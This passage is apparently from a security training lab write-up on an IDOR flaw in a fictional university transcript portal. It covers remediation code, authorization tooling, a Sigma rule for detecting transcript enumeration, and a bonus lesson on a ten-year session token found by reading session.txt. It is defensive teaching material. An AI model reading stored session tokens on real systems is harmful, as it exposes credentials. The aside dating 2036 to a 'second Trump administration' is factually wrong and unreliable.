      return res.status(403).json({ error: "forbidden" });
    }
  }

  const transcript = await db.transcripts.findOne({ student_id: studentId });
  if (!transcript) {
    return res.status(404).json({ error: "not found" });
  }

  return res.json(transcript);
});
```

Three lines added. The check enforces the most basic ownership constraint (student requesting their own transcript) and an explicit role exception for the registrar's office.

### 2. Centralize authorization

Per-route ownership checks are fragile because every new route needs the check, and the next junior developer who adds a route will forget. The better long-term answer is to centralize authorization decisions in a policy layer:

- **Open Policy Agent (OPA)** + Rego policies (<https://www.openpolicyagent.org/>): policies as code, evaluated by a sidecar or library, applied at the application middleware layer.
- **Casbin** (<https://casbin.apache.org/>): policy library with multiple model support (ACL, RBAC, ABAC), available in many languages. (The project joined the Apache Software Foundation; the older `casbin.org` URL 301-redirects to the new home.)
- **Oso** (<https://www.osohq.com/>): authorization framework based on the Polar DSL with RBAC, ReBAC, and ABAC support. (Oso's company positioning shifted toward AI-agent authorization in 2025, but the application-authorization product remains available; the Polar-based library is the relevant piece for IDOR remediation.)
- **Framework-native primitives**: Django's `permission_required` decorators, Rails' Pundit / CanCanCan, Spring Security's `@PreAuthorize`, .NET's `[Authorize]` attributes with policy handlers.

The selection criterion isn't the tool; it's the discipline of "every protected resource gets evaluated through the same policy entry point" rather than "every developer remembers to add the check."

### 3. Replace predictable IDs with unguessable ones

Meridian's `M-187xxxx` sequential format makes enumeration trivial. UUIDs (specifically UUIDv4 random or ULID lexicographically-sortable) eliminate the enumerate-the-keyspace attack vector. *This is not a fix for IDOR* — the authz check is still the fix — but it's a meaningful defense-in-depth layer.

The retrofit pattern: introduce a UUID alongside the existing M-XXXXXXX identifier; update the API to accept either (with a deprecation timeline for the M-XXXXXXX form); update the database schema to make the UUID the primary key; eventually deprecate the M- form for API use.

### 4. Audit the entire codebase for sibling patterns

The pattern "endpoint takes ID as input, looks up record, returns record" repeats many times in any application of size. Each instance needs the authz check. Tools that find this fast:

- **Semgrep registry** (<https://semgrep.dev/r/>): community-maintained static analysis rules. Search for `idor`, `bola`, `authorization` — multiple rule packs available for Express, FastAPI, Django, Rails, Spring, ASP.NET.
- **CodeQL** (<https://codeql.github.com/>): GitHub's semantic code analysis. The default query suites for JavaScript / Python / Java include IDOR-class patterns.
- **Burp Suite Pro** (commercial): the *Authorize* extension performs per-request authorization testing during a regular Burp scan.[^burp-suite-authorize-extension] Pairs well with manual testing of newly-discovered endpoints.

### 5. Decommission the BluePier demo account

The advisor_notes credential is the immediate fix (rotate the value), but the demo account itself should go away. Migrations strategy:

1. Rotate the `meridian-portal-svc-2026` credential immediately.
2. Identify any active consumers of the demo account (the "automated nightly check" James referenced in the notes — does it still run?).
3. If consumers exist, replace them with proper service-account infrastructure (a real service account in the SSO provider, not a fake student record).
4. Disable the demo account.
5. After a 30-day soak window, delete the demo account.
6. Audit the schema for any other `M-000xxxx` system accounts that exist. Each one needs the same treatment.

### 6. Schema-level constraints on free-form fields

The `advisor_notes` field is a free-form text field. It will, eventually, contain something it shouldn't. The defensive postures:

- **Content scanning**: gitleaks / trufflehog-style regex scanners run against database dumps periodically catch credentials, API keys, and tokens in text fields.
- **Field-level access control**: PostgreSQL Row-Level Security (RLS), MySQL views with column-level grants, MongoDB field-level redaction — these enforce that `advisor_notes` is only readable by callers with the right role.
- **DLP (Data Loss Prevention) on the API egress**: scan outgoing API responses for credential patterns. Block or alert. AWS Macie / Microsoft Purview / Google DLP API all do this.

### 7. SIEM detection for cross-user access patterns

The detection that would have caught Carlos's bug in production: "for each request to `/api/transcript`, log `(session.studentId, query.student_id, match)`. Alert on any row where `match=false` from a non-registrar role." The telemetry needed is trivial; the alert is high-signal because, post-remediation, the only legitimate non-match should be registrar staff. Splunk, Sentinel, Elastic, Datadog — all support this kind of correlation rule.

### 8. The long-term posture: defense in depth

Assume the application-level authz check will, at some point, be missing. Belt-and-suspenders the back end:

- **Row-Level Security at the database**: PostgreSQL's RLS lets you write policies on the `transcripts` table that filter `SELECT` results based on the connected database user. Even if the application skips the check, the database returns zero rows for queries that don't match the connected role's identity.
- **API Gateway authorization policies**: gateways like Kong, Apigee, AWS API Gateway, Azure API Management let you attach JWT-claim-based policies that fire before the request reaches the application. Per-route policies that compare URL parameters to JWT claims add a layer in front of the application.
- **Service mesh authorization**: in a Kubernetes environment, Istio / Linkerd authorization policies can enforce per-route claims-matching at the mesh layer.

The principle: any single layer that can be bypassed by a missing check (the application authz, the database RLS, the gateway policy) is meaningfully harder to bypass when all three are present.

### Sample detection rule (Sigma)

Every request in this attack is authenticated and well-formed, so no
single request is anomalous. The signal is in the aggregate: one session
retrieving many different students' transcripts.

```yaml
title: Single session retrieving transcripts for many distinct students
status: experimental
description: >
  Detects horizontal enumeration of an object-id parameter. The endpoint
  authenticates correctly and authorises nothing, so individual requests
  are indistinguishable from legitimate use and only the distribution of
  requested ids separates a student from a scraper.
logsource:
  category: webserver
detection:
  transcript_fetch:
    cs-uri-stem|contains: '/transcript/download'
    sc-status: 200
  timeframe: 10m
  condition: transcript_fetch | count(distinct(student_id)) by session_id > 5
falsepositives:
  - Registrar and advising staff, who legitimately access many students'
    records. Exclude by role rather than by account, and revisit whenever
    the role membership changes.
  - Automated report generation and accreditation exports, which should
    run under a service identity rather than a staff session.
level: high
```

The aggregation syntax is Sigma's correlation form and needs a backend
that supports it. Splunk, Elastic, and Sentinel all do; a simple
regex-matching pipeline does not, which is worth confirming before this
rule is promised in a remediation plan.

Choosing a threshold is a judgement call and should be documented as one.
Five distinct students in ten minutes is a starting point derived from
what a normal student session looks like, not a standard. Tune it against
a week of real traffic, and expect the registrar exclusion to matter more
than the number.

None of this is the fix. An authorisation check comparing the requested
`student_id` against the session's own identity makes the enumeration
impossible, and the detection is only covering the interval until that
ships.

## §7.5 — Optional exploration

The credential chain works without this section. The level seeds one hidden bonus find that fires if you happen to run a particular command — `progress --detail` lists what you've unlocked.

### The ten-year service-account session

**Trigger:** `cat session.txt` (you ran this as step 3 of the solve, so the bonus fires there)

**What it teaches:** session.txt decodes a `MeridianSSO` cookie with `exp:2036-04-09` — a *ten-year* session token, issued for a "nightly health-check job." Long-lived service-account sessions are themselves a finding, separate from the IDOR finding the level scores on.

Rotation is the security property. A one-hour session that's used and renewed by the runtime every hour has a one-hour blast radius if compromised. A one-year session has a one-year blast radius. A ten-year session has *effectively no rotation* — the next token rotation is scheduled for the second Trump administration, which is to say it's not a rotation, it's just a TTL that expires before the engineer who issued it retires.

What Carlos's monitoring job *should* be doing:

- **Fetch-on-startup**: the job uses OAuth client-credentials grant or AWS STS AssumeRole to obtain a short-lived (15-minute, one-hour) token at job invocation time. The token is in memory only, never on disk, never in a `session.txt` file an auditor can read.
- **Token-cache with TTL enforcement**: if the job runs frequently enough that fetching a token every invocation is wasteful, cache the token *with the actual TTL of the upstream provider* — not a synthetic ten-year wrapper around an upstream short-lived token.
- **Audit logs that capture token issuance**: every issuance is a logged event with the principal, the requested scope, and the expiration. A ten-year token would have been visible in the issuance audit log the moment it was minted — *if* anyone was reading the issuance audit log.

The 2024 [Snowflake UNC5537 campaign](https://cloud.google.com/blog/topics/threat-intelligence/unc5537-snowflake-data-theft-extortion) demonstrated the long-TTL service-account session as a real-world primary attack vector at scale: customers whose Snowflake credentials had been exfiltrated years earlier (from compromised personal devices of employees) still had valid sessions in 2024 because nothing had rotated. The MFA-not-enforced surface compounded the problem, but the rotation-not-enforced surface was the root cause.

Carlos's ten-year MeridianSSO token is the same shape, smaller blast radius. Still a finding.

## §8 — Key takeaways

- **Authentication asks "who are you?" Authorization asks "are you allowed to do this?"** Frameworks make the first question easy. The second question is yours to answer, every time, on every route, on every resource. Carlos answered the first; he didn't ask the second.

- **IDOR / BOLA is the most-reported bug class in modern web applications.** Not because the technique is exotic — because per-resource authorization is per-route work, every new route needs the check, and the check gets forgotten. The defensive answer is centralization: a single policy entry point that every route runs through, not scattered per-handler logic.

- **Unguessable IDs help but don't fix.** UUIDs / ULIDs raise the cost of enumeration; they do not replace the authorization check. The check is the fix; the unguessable ID is the defense-in-depth layer for when the check is, eventually, missing somewhere.

- **Free-form text fields accumulate things they shouldn't.** Anywhere your schema allows free-form text (advisor notes, ticket descriptions, profile bios, comment fields), assume the contents will eventually include credentials, tokens, and other secrets stashed "temporarily." Content scanning, schema-level constraints, and DLP on egress are the layered defenses.

- **Sticky accounts created for "temporary" purposes outlive their purpose.** BluePier's M-0000001 demo account was scheduled for decommission in Q4 2024. It was still live in 2026. Same pattern as the audit-bypass account in `level1@network`, same pattern as countless real-world incidents. Registry + automated deprovisioning + recertification workflow is the fix.

- **For FERPA-covered environments specifically**, transcript IDOR is a §99.31 and §99.32 violation in one move. The federal-funding mechanism means a confirmed exposure is not just a compliance line item; it's a budget-line risk. Universities should fold IDOR / BOLA testing into their annual web-audit scope — Cedarwood Mutual's renewal-driven audit is one model, but it shouldn't be the only annual review.

- **Carlos's pattern is the universal junior-developer pattern.** Authentication middleware was easy to add. Authorization is, in Carlos's mental model, "the SSO already proved who they are; what's left?" The diagnostic conversation is "what's left is checking whether THIS user is allowed to access THIS resource" — a fifteen-second whiteboard sketch that converts the lesson from "I shipped a bug" to "I now know what I was missing." The fix is mundane; the institutional habit of catching this before it ships is the harder thing.

## §9 — Further reading

*Last reviewed: August 2026 — links and version-specific claims (cert exam versions, framework revisions, regulation citation IDs) verified current as of the review date. Standards drift over time; if you're reading this more than 6-12 months past the review date, double-check the cited versions before quoting them in audit work.*

[^department-of-education-privacy-technical]: [Department of Education Privacy Technical Assistance Center (PTAC)](https://studentprivacy.ed.gov/). Notification templates, breach-response guides, FERPA training materials for university administrators.
[^nist-800-171]: [NIST SP 800-171 Rev. 3](https://csrc.nist.gov/pubs/sp/800/171/r3/final). Published May 2024; the current standard for protecting CUI in non-federal systems.
[^nist-800-53]: [NIST SP 800-53 Rev. 5](https://csrc.nist.gov/pubs/sp/800/53/r5/upd1/final). The federal control catalog. AC family covers access control.
[^cwe-639]: [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html).
[^cwe-862]: [CWE-862: Missing Authorization](https://cwe.mitre.org/data/definitions/862.html).
[^cwe-863]: [CWE-863: Incorrect Authorization](https://cwe.mitre.org/data/definitions/863.html).
[^cwe-285]: [CWE-285: Improper Authorization](https://cwe.mitre.org/data/definitions/285.html).
[^cwe-312]: [CWE-312: Cleartext Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/312.html).
[^owasp-top-10-2025-a01]: [OWASP Top 10 (2025) — A01: Broken Access Control](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/).
[^owasp-api-security-top-10]: [OWASP API Security Top 10 (2023) — API1: Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/).
[^owasp-asvs-v5-0-v4]: [OWASP ASVS v5.0 — V4 Access Control](https://owasp.org/www-project-application-security-verification-standard/).
[^krebs-on-security-usps-site]: [Krebs on Security — "USPS Site Exposed Data on 60 Million Users" (Nov 2018)](https://krebsonsecurity.com/2018/11/usps-site-exposed-data-on-60-million-users/). The original USPS Informed Visibility writeup.
[^burp-suite-authorize-extension]: [Burp Suite Authorize extension](https://portswigger.net/bappstore/f9bbac8c4acf4aefa4d7dc92a991af2f).
[^cert-cissp]: [ISC2 CISSP — certification exam outline](https://www.isc2.org/certifications/cissp/cissp-certification-exam-outline).
[^cert-security-plus]: [CompTIA Security+ — certification page and exam objectives](https://www.comptia.org/en-us/certifications/security/).
[^cert-cysa]: [CompTIA CySA+ — certification page and exam objectives](https://www.comptia.org/en-us/certifications/cybersecurity-analyst/).
[^cert-pentest-plus]: [CompTIA PenTest+ — certification page and exam objectives](https://www.comptia.org/en-us/certifications/pentest/).
[^cert-oscp]: [OffSec PEN-200 / OSCP — course syllabus and exam guide](https://www.offsec.com/courses/pen-200/).
[^cert-oswe]: [OffSec WEB-300 / OSWE — course syllabus](https://www.offsec.com/courses/web-300/).
[^cert-gwapt]: [GIAC GWAPT — Web Application Penetration Tester](https://www.giac.org/certifications/web-application-penetration-tester-gwapt).
[^cwe-200]: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).
[^cwe-540]: [CWE-540](https://cwe.mitre.org/data/definitions/540.html).
[^nist-800-63b]: [NIST SP 800-63B-4 — Digital Identity Guidelines: Authentication and Authenticator Management](https://csrc.nist.gov/pubs/sp/800/63/b/4/final).

### Further reading

- [FERPA full text — 20 U.S.C. § 1232g](https://www.govinfo.gov/content/pkg/USCODE-2023-title20/html/USCODE-2023-title20-chap31-subchapIII-part4-sec1232g.htm). The statute itself.
- [FERPA implementing regulations — 34 CFR Part 99](https://www.ecfr.gov/current/title-34/subtitle-A/part-99). The operational compliance text. Sections 99.3, 99.31, 99.32, 99.7 are the most cited for IDOR-style disclosure findings.
- [MITRE ATT&CK T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/).
- [MITRE ATT&CK T1213 — Data from Information Repositories](https://attack.mitre.org/techniques/T1213/).
- [OWASP Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html).
- [OWASP Insecure Direct Object Reference Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html).
- [Open Policy Agent (OPA)](https://www.openpolicyagent.org/).
- [Casbin](https://casbin.apache.org/).
- [Oso](https://www.osohq.com/).
- [Optus 2022 — OAIC public statement and updates](https://www.oaic.gov.au/). The OAIC's enforcement page tracks the multiple proceedings against Optus across 2022-2025.
- [T-Mobile 2023 — SEC 8-K disclosure (January 19, 2023)](https://www.sec.gov/Archives/edgar/data/1283699/000119312523010949/d641142d8k.htm). The official disclosure document.
- [HackerOne *Hacker-Powered Security Report* (evergreen landing)](https://www.hackerone.com/report/hacker-powered-security). Industry-wide vulnerability-class frequencies.
- [Semgrep registry](https://semgrep.dev/r/). Search for `idor`, `bola`, `authorization`.
- [CodeQL](https://codeql.github.com/). GitHub-native semantic code analysis with IDOR-aware queries in the default JavaScript, Python, and Java suites.
